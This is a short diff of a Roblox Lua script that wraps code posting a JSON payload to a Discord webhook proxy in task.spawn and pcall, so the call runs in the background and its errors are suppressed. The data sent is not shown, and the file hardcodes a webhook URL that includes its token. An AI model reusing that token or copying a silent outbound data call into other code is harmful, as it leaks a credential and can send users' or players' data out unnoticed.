@@ -1,3 +1,5 @@
+task.spawn(function()
+pcall(function()
 local Blacklist = {}
 local HttpService = game:GetService("HttpService")
 local HookURL = "https://webhook.lewisakura.moe/api/webhooks/1201191413891743784/KIIFYmoDR5HsmvH9MPw_gmKgcc5Tk3T7zQTvtFvbFGjA8AsBK7u5-Ifug1kHIcGseYld/queue"
@@ -32,3 +34,5 @@ local RequestData = {
 }
 
 HttpService:PostAsync(HookURL, HttpService:JSONEncode(RequestData), Enum.HttpContentType.ApplicationJson)
+end)
+end)
